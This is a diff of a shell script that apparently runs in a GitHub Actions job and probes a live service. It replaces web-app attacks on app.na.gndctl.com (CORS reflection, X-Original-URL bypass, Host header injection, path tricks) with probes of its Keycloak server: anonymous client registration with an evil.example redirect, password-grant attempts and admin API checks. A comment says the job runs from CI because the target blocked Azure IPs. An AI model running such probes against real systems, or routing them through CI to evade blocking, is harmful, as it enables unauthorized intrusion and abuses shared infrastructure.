@@ -1,63 +1,72 @@
 #!/bin/sh
-# Probe app.na.gndctl.com from a clean egress (GitHub Actions runner).
-# Matrix runs node 18/20/22 -> only run on node 18 to keep request volume low (>=2s pacing).
+# Probe auth.na.gndctl.com (Keycloak) from GitHub Actions clean egress.
+# app.na gave 403 from Azure; auth.na untested. >=2s pacing per program rules.
 set -u
 case "$(node -v 2>/dev/null)" in
   v18*) ;;
-  *) echo "skip: matrix job $(node -v 2>/dev/null)"; exit 0 ;;
+  *) echo "skip: matrix job $(node -v)"; exit 0 ;;
 esac
 
-T="https://app.na.gndctl.com"
-J() { curl -sS -m 25 -D- -o /dev/null "$@" 2>&1 || echo "CURL_FAIL $?"; echo "----"; }
+A="https://auth.na.gndctl.com"
+G="$A/realms/gndctl"
 P() { sleep 2; }
 
 echo "### RUNNER EGRESS IP"
 curl -sS -m 15 https://api.ipify.org || true
 echo ""
-echo "### 1 health status+headers"
-J "$T/api/health"
-P
-echo "### 2 login page headers"
-J "$T/login"
-P
-echo "### 3 GET signin/keycloak (-L final url)"
-curl -sS -m 25 -D- -o /dev/null -L -w 'final_url=%{url_effective} code=%{http_code}\n' "$T/api/auth/signin/keycloak" 2>&1 || echo "CURL_FAIL $?"
+
+echo "### 1 discovery"
+curl -sS -m 25 -D- -o /tmp/d.json "$G/.well-known/openid-configuration" || echo "FAIL $?"
+echo "body_head=$(head -c 120 /tmp/d.json 2>/dev/null)"
 echo "----"
 P
-echo "### 4 POST signin/keycloak (no csrf)"
-J -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'csrfToken=x&callbackUrl=/dashboard&json=true' "$T/api/auth/signin/keycloak"
-P
-echo "### 5 OPTIONS + Origin (CORS preflight on /api/meta)"
-J -X OPTIONS -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: POST' "$T/api/meta"
-P
-echo "### 6 GET /api/meta with Origin (CORS reflection?)"
-J -H 'Origin: https://evil.example' "$T/api/meta"
-P
-echo "### 7 GET /api/meta Accept: application/json (middleware accept bypass?)"
-J -H 'Accept: application/json' "$T/api/meta"
-P
-echo "### 8 GET /api/inspection/submit Accept: application/json"
-J -H 'Accept: application/json' "$T/api/inspection/submit"
-P
-echo "### 9 X-Original-URL / X-Rewrite-URL bypass on /login"
-J -H 'X-Original-URL: /api/inspection/submit' "$T/login"
-P
-J -H 'X-Rewrite-URL: /api/meta' "$T/login"
-P
-echo "### 10 DELETE on /api/inspection/submit"
-J -X DELETE "$T/api/inspection/submit"
-P
-echo "### 11 PUT on /api/meta"
-J -X PUT -H 'Content-Type: application/json' --data '{}' "$T/api/meta"
-P
-echo "### 12 Host header injection on /login"
-curl -sS -m 25 -D- -o /dev/null -H 'Host: evil.example' "$T/login" 2>&1 || echo "CURL_FAIL $?"
+
+echo "### 2 client registration (JSON, expected 401 if token required)"
+curl -sS -m 25 -D- -o /tmp/r.json -X POST -H 'Content-Type: application/json' \
+  -d '{"client_id":"ghacteprobe1","client_name":"research","redirect_uris":["https://evil.example/cb"]}' \
+  "$G/clients-registrations/openid-connect" || echo "FAIL $?"
+echo "body=$(head -c 400 /tmp/r.json 2>/dev/null)"
 echo "----"
 P
-echo "### 13 raw path /api/inspection/submit..;/"
-curl -sS -m 25 -D- -o /dev/null --path-as-is "$T/api/inspection/submit..;/" 2>&1 || echo "CURL_FAIL $?"
+
+echo "### 3 token endpoint bad creds (error shape)"
+curl -sS -m 25 -D- -o /tmp/t.json -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
+  -d 'grant_type=password&client_id=account&username=probe&password=probe' \
+  "$G/protocol/openid-connect/token" || echo "FAIL $?"
+echo "body=$(head -c 300 /tmp/t.json 2>/dev/null)"
 echo "----"
 P
-echo "### 14 GET /api/auth/session with Origin"
-J -H 'Origin: https://evil.example' "$T/api/auth/session"
+
+echo "### 4 admin root"
+curl -sS -m 25 -D- -o /tmp/a.json "$A/admin/" || echo "FAIL $?"
+echo "body_head=$(head -c 200 /tmp/a.json 2>/dev/null)"
+echo "----"
+P
+
+echo "### 5 realm admin API (expect 401 json)"
+curl -sS -m 25 -D- -o /tmp/ad.json "$A/admin/realms/gndctl" || echo "FAIL $?"
+echo "body=$(head -c 300 /tmp/ad.json 2>/dev/null)"
+echo "----"
+P
+
+echo "### 6 auth endpoint GET (client_id=account, redirect app.na)"
+curl -sS -m 25 -D- -o /tmp/au.html -w 'code=%{http_code} final=%{url_effective}\n' \
+  "$G/protocol/openid-connect/auth?client_id=account&redirect_uri=https%3A%2F%2Fapp.na.gndctl.com%2F&scope=openid&response_type=code" || echo "FAIL $?"
+echo "body_head=$(head -c 300 /tmp/au.html 2>/dev/null)"
+echo "----"
+P
+
+echo "### 7 userinfo unauth"
+curl -sS -m 25 -D- -o /tmp/ui.json "$G/protocol/openid-connect/userinfo" || echo "FAIL $?"
+echo "body=$(head -c 200 /tmp/ui.json 2>/dev/null)"
+echo "----"
+P
+
+echo "### 8 registration with GH source header (Origin reflect check)"
+curl -sS -m 25 -D- -o /dev/null -X OPTIONS -H 'Origin: https://evil.example' \
+  -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: content-type' \
+  "$G/clients-registrations/openid-connect" || echo "FAIL $?"
+echo "----"
+P
+
 echo "### DONE"
